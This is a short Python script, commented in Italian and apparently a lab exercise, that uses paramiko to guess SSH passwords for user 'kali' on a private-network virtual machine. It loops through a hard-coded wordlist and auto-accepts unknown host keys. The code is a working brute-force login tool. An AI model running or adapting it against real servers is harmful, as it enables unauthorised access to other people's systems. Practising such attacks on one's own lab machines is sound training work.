#importiamo la libreria interessata
import paramiko

#creiamo una funzione per testare l'autenticazione SSH con username, hostname e password 
def test_authentication(username, hostname, password):
    #creiamo un client SSH
    client = paramiko.SSHClient()

    #accettiamo automaticamente le chiavi host mancanti 
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #proviamo a connetterci con le credenziali fornite
    try:
        client.connect(hostname, username=username, password=password)
        print(f"Authentication successful: {username}:{password}")
        return True
    #gestiamo l'eccezione di autenticazione fallita con un messaggio di autenticazione fallita
    except paramiko.AuthenticationException:
        print(f"Authentication failed: {username}:{password}")
        return False
    
    finally:
        client.close()

# aggiungiamo una lista di password da testare 
passwords = ["password", "secret", "Ambrogio", "Rambo", "Libico", "Lambretta", "Kawasaky", "kali", "Ducati"]

# cicliamo attraverso la lista di password e testiamo l'autenticazione sul server SSH della nostra VM Kali Linux
for p in passwords:
    if test_authentication("kali", "192.168.50.100", p):
        break